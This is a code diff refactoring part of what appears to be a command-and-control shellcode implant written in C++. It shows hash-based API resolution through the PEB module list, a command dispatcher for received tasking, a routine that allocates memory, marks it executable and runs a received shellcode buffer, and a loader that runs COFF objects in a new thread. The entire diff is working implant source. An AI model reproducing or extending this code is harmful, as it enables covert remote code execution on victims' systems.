@@ -1,14 +1,21 @@
-#include <core/include/memory.hpp>
-namespace Memory {
+#include <include/memory.hpp>
 
+using namespace Utils;
+using namespace Parser;
+using namespace Objects;
+using namespace Threads;
+using namespace Commands;
+
+namespace Memory {
     namespace Methods {
 
         UINT_PTR GetStackCookie() {
 
             uintptr_t cookie = 0;
-            x_ntassert(Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) 0x24, &cookie, 0x4, nullptr));
+            if (!NT_SUCCESS(Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) 0x24, &cookie, 0x4, nullptr))) {
+                return 0;
+            }
 
-            defer:
             return cookie;
         }
 
@@ -42,7 +49,7 @@ namespace Memory {
 
     namespace Context {
 
-        VOID ContextInit() {
+        BOOL ContextInit() {
             // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
 
             _hexane instance    = { };
@@ -55,17 +62,23 @@ namespace Memory {
             instance.base.address           = U_PTR(InstStart());
             instance.base.size              = U_PTR(InstEnd()) - instance.base.address;
 
-            x_assert(instance.modules.ntdll = M_PTR(NTDLL));
-            x_assert(F_PTR_HMOD(instance.nt.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP));
+            if (!(instance.modules.ntdll = M_PTR(NTDLL))) {
+                return false;
+            }
+
+            F_PTR_HMOD(instance.nt.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP);
+            if (!instance.nt.RtlAllocateHeap) {
+                return false;
+            }
 
             region = RVA(PBYTE, instance.base.address, &__instance);
-            x_assert(C_DREF(region) = instance.nt.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)));
+            if (!(C_DREF(region) = instance.nt.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
+                return false;
+            }
 
             x_memcpy(C_DREF(region), &instance, sizeof(_hexane));
             x_memset(&instance, 0, sizeof(_hexane));
             x_memset(RVA(PBYTE, region, sizeof(LPVOID)), 0, 0xE);
-
-        defer:
         }
 
         VOID ContextDestroy() {
@@ -82,7 +95,6 @@ namespace Memory {
         }
     }
 
-
     namespace Modules {
 
         HMODULE GetModuleAddress(const LDR_DATA_TABLE_ENTRY *data) {
@@ -91,7 +103,7 @@ namespace Memory {
 
         LDR_DATA_TABLE_ENTRY* GetModuleEntry(const uint32_t hash) {
 
-            LIST_ENTRY *head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;
+            const auto head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;
 
             for (auto next = head->Flink; next != head; next = next->Flink) {
                 const auto mod  = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
@@ -99,7 +111,7 @@ namespace Memory {
 
                 wchar_t buffer[MAX_PATH] = { };
 
-                if (hash - Utils::HashStringW(x_wcs_tolower(buffer, name.Buffer), x_wcslen(name.Buffer)) == 0) {
+                if (hash - HashStringW(x_wcs_tolower(buffer, name.Buffer), x_wcslen(name.Buffer)) == 0) {
                     return mod;
                 }
             }
@@ -123,7 +135,7 @@ namespace Memory {
 
                 char buffer[MAX_PATH] = { };
 
-                if (hash - Utils::HashStringA(x_mbs_tolower(buffer, name), x_strlen(name)) == 0) {
+                if (hash - HashStringA(x_mbs_tolower(buffer, name), x_strlen(name)) == 0) {
                     address = (FARPROC) (base + ((uint32_t*)(base + exports->AddressOfFunctions))[index]);
                     break;
                 }
@@ -132,23 +144,24 @@ namespace Memory {
             return address;
         }
 
-        UINT_PTR LoadExport(const char* const module_name, const char* const export_name) {
+        UINT_PTR LoadExport(char* const module_name, char* const export_name) {
 
             uintptr_t symbol    = 0;
-            int reload          = 0;
+            bool reload         = false;
 
             char buffer[MAX_PATH] = { };
 
-            const auto mod_hash = Utils::HashStringA(x_mbs_tolower(buffer, module_name), x_strlen(module_name));
-            const auto fn_hash  = Utils::HashStringA(x_mbs_tolower(buffer, export_name), x_strlen(export_name));
+            const auto mod_hash = HashStringA(x_mbs_tolower(buffer, module_name), x_strlen(module_name));
+            const auto fn_hash  = HashStringA(x_mbs_tolower(buffer, export_name), x_strlen(export_name));
 
             while (!symbol) {
-                if (!(F_PTR_HASHES(symbol, mod_hash, fn_hash))) {
-                    if (reload || !Ctx->win32.LoadLibraryA((const char*) module_name)) {
+                F_PTR_HASHES(symbol, mod_hash, fn_hash);
+
+                if (!symbol) {
+                    if (reload || !Ctx->win32.LoadLibraryA((const char*) module_name)) { // this is sus...
                         goto defer;
                     }
-
-                    reload = 1;
+                    reload = true;
                 }
             }
 
@@ -158,65 +171,76 @@ namespace Memory {
     }
 
     namespace Execute {
+
         BOOL ExecuteCommand(_parser& parser) {
-            _command cmd = {};
-            uintptr_t command = {};
 
-            const auto cmd_id = Parser::UnpackDword(&parser);
-            bool success = true;
+            _command cmd        = { };
+            uintptr_t command   = { };
 
+            const auto cmd_id = UnpackDword(&parser);
             if (cmd_id == NOJOB) {
-                goto defer;
+                return true;
             }
 
-            x_assertb(command = Commands::GetCommandAddress(cmd_id));
+            if (!(command = GetCommandAddress(cmd_id))) {
+                // LOG ERROR
+                return false;
+            }
 
-            cmd = (_command)RVA(PBYTE, Ctx->base.address, command);
+            cmd = (_command) RVA(PBYTE, Ctx->base.address, command);
             cmd(&parser);
 
-        defer:
-            return success;
+            return true;
         }
 
         BOOL ExecuteShellcode(const _parser& parser) {
-            void (*exec)() = {};
-            void* address = {};
+            void (*exec)()  = { };
+            void* address   = { };
 
-            size_t size = parser.Length;
             bool success = true;
+            size_t size = parser.Length;
 
-            x_ntassertb(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+            if (!NT_SUCCESS(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+                // LOG ERROR
+                success = false;
+                goto defer;
+            }
 
             x_memcpy(address, parser.buffer, parser.Length);
-            x_ntassertb(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &address, &size, PAGE_EXECUTE_READ, nullptr));
+            if (!NT_SUCCESS(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &address, &size, PAGE_EXECUTE_READ, nullptr))) {
+                // LOG ERROR
+                success = false;
+                goto defer;
+            }
 
-            exec = (void(*)())address;
+            exec = (void(*)()) address;
             exec();
 
             x_memset(address, 0, size);
 
         defer:
-            if (address) { Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE); }
+            if (address) {
+                Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE);
+            }
             return success;
         }
 
         VOID LoadObject(_parser parser) {
-            // todo: maybe loadable objects in remote processes??
 
-            _injection_ctx inject = {};
-            _coff_params* params = (_coff_params*)x_malloc(sizeof(_coff_params));
+            _injection_ctx inject = { };
+            _coff_params* params = (_coff_params*) x_malloc(sizeof(_coff_params));
 
-            params->entrypoint  = Parser::UnpackString(&parser, (uint32_t*)&params->entrypoint_size);
-            params->data        = Parser::UnpackBytes(&parser, (uint32_t*)&params->data_size);
-            params->args        = Parser::UnpackBytes(&parser, (uint32_t*)&params->args_size);
-            params->cache       = Parser::UnpackBool(&parser);
+            params->entrypoint  = UnpackString(&parser, (uint32_t*)&params->entrypoint_size);
+            params->data        = UnpackBytes(&parser, (uint32_t*)&params->data_size);
+            params->args        = UnpackBytes(&parser, (uint32_t*)&params->args_size);
+            params->cache       = UnpackBool(&parser);
             params->task_id     = Ctx->session.current_taskid;
 
             inject.parameter = params;
             Ctx->threads++;
 
-            if (!Threads::CreateUserThread(NtCurrentProcess(), true, (void*)Objects::CoffThread, params, nullptr)) {
-                // get error
+            if (!CreateUserThread(NtCurrentProcess(), true, (void*) CoffThread, params, nullptr)) {
+                // LOG ERROR
             }
         }
     }
